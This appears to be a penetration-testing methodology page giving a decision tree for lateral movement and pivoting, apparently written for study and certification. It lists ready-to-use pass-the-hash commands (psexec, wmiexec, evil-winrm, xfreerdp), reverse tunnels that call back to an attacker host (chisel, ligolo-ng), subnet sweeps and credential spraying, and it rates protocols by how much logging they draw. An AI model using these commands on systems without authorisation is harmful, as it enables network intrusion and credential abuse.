# Lateral Movement & Pivoting Flow

## Entry Conditions
- Valid credentials (cleartext, hash, ticket, or key) for other hosts OR
- Shell access on a host that can reach new subnets OR
- Need to move from current host to another host/network

## Decision Tree

```
Movement opportunity identified
│
├── [CHECK 1] What do you have?
│   ├── CLEARTEXT PASSWORD → Lateral movement (most flexible)
│   ├── NT HASH only → Pass-the-Hash
│   ├── KERBEROS TICKET → Pass-the-Ticket
│   ├── SSH KEY → SSH authentication
│   └── SERVICE CREDENTIAL → Service-specific lateral
│
├── [CHECK 2] Where do you want to go?
│   ├── SAME SUBNET, different host → Lateral movement
│   │   ├── Check target open ports first
│   │   └── Choose protocol based on available ports
│   └── DIFFERENT SUBNET → Pivoting required
│       ├── Multi-homed host available?
│       │   ├── YES → Deploy pivot tool
│       │   └── NO → Check other known hosts for dual-homed
│
├── [LATERAL] Protocol selection
│   │
│   ├── Port 445 (SMB) open? → Best choice (gives SYSTEM)
│   │   ├── PT Cleartext: psexec.py domain/user:pass@target
│   │   ├── PT Hash: psexec.py -hashes :hash domain/user@target
│   │   ├── PT Cleartext: wmiexec.py domain/user:pass@target
│   │   └── PT Hash: wmiexec.py -hashes :hash domain/user@target
│   │
│   ├── Port 5985/5986 (WinRM) open? → Interactive shell
│   │   ├── PT Cleartext: evil-winrm -i target -u user -p pass
│   │   └── PT Hash: evil-winrm -i target -u user -H hash
│   │
│   ├── Port 3389 (RDP) open? → GUI access
│   │   ├── PT Cleartext: xfreerdp /v:target /u:user /p:pass
│   │   └── PT Hash: xfreerdp /v:target /u:user /pth:hash
│   │
│   ├── Port 22 (SSH) open? → Linux/Windows SSH
│   │   └── PT Cleartext: ssh user@target
│   │
│   └── Port 135 (WMI) open? → WMI execution
│       ├── PT Cleartext: wmiexec.py domain/user:pass@target
│       └── PT Hash: wmiexec.py -hashes :hash domain/user@target
│
├── [PIVOT] Tool selection
│   │
│   ├── Root/admin on pivot host?
│   │   ├── YES → Ligolo-ng (best choice: full VPN tunnel)
│   │   │   ├── Attacker: sudo ip route add <subnet>/24 dev ligolo
│   │   │   └── Target: ./ligolo-agent -connect attacker:11601 -ignore-cert
│   │   └── NO → Chisel (no root needed)
│   │       ├── Attacker: chisel server -p 8000 --reverse
│   │       └── Target: ./chisel client attacker:8000 R:1080:socks
│   │
│   ├── SSH access to Linux pivot?
│   │   └── SSHuttle (simple VPN tunnel)
│   │       └── sshuttle -r user@pivot <subnet>/24
│   │
│   ├── Need single port forward?
│   │   └── SSH -L: ssh -L local_port:target:remote_port user@pivot
│   │
│   └── Windows pivot only?
│       ├── SocksOverRDP (if RDP available)
│       ├── Ligolo-ng (Windows agent available)
│       └── netsh interface portproxy (simple port forward)
│
├── [POST-PIVOT] Actions on new subnet
│   │
│   ├── MUST DO immediately:
│   │   ├── nmap -sn <new_subnet>/24 → Live hosts
│   │   ├── netexec smb <new_subnet>/24 -u known_user -p known_pass
│   │   ├── Check for AD domain in new subnet
│   │   └── Identify web servers, DB servers, DCs
│   │
│   └── RESTART methodology from Module 02
│       └── Full TCP scan on new hosts → Service enum → Exploitation
│
└── [POST-LATERAL] Actions on new host
    │
    ├── Immediately:
    │   ├── whoami / id → Check current user
    │   ├── ipconfig / ifconfig → Check network (may be multi-homed)
    │   ├── netstat -rn / route print → Routing table
    │   └── arp -a → ARP cache
    │
    └── Full post-exploitation loop (Module 13)
        ├── Credential harvest
        ├── Priv escalation (if needed)
        ├── AD enumeration (if domain-joined)
        ├── Pivoting check
        └── Credential spray from new host

## Protocol Priority (for Lateral Movement)

| Priority | Protocol | Tool | Notes |
|----------|----------|------|-------|
| 1 | SMB (445) | psexec.py | Gives SYSTEM, most reliable |
| 2 | WinRM (5985) | evil-winrm | Interactive PowerShell, clean |
| 3 | WMI (135) | wmiexec.py | Reliable, slower, less logging |
| 4 | RDP (3389) | xfreerdp | GUI, more detectable |
| 5 | SSH (22) | ssh | Linux/Windows 2019+, cleartext only |
| 6 | Scheduled Task | atexec.py | Reliable SMB alternative |

## Pivot Tool Selection

| Requirement | Tool | Root Needed | Speed | Complexity |
|-------------|------|-------------|-------|------------|
| Full subnet access | Ligolo-ng | Yes (Linux) | Fast | Medium |
| No root on pivot | Chisel | No | Medium | Low |
| SSH access only | SSHuttle | No (SSH) | Fast | Low |
| Single port forward | SSH -L | No (SSH) | Fast | Low |
| Windows pivot | SocksOverRDP | No (RDP) | Medium | Medium |

## Cross-References
- Credential harvesting → [Module 13](../modules/13-post-exploitation.md)
- AD lateral movement → [Module 11](../modules/11-active-directory.md)
- Password cracking → [Module 06](../modules/06-password-attacks.md)
- Service enumeration → [Module 07](../modules/07-common-services.md)
- Ligolo-ng setup → [assets/cheatsheets/ligolo.md](../assets/cheatsheets/ligolo.md)
- Attack Graph navigation → [Module 99](../modules/99-attack-graph.md)
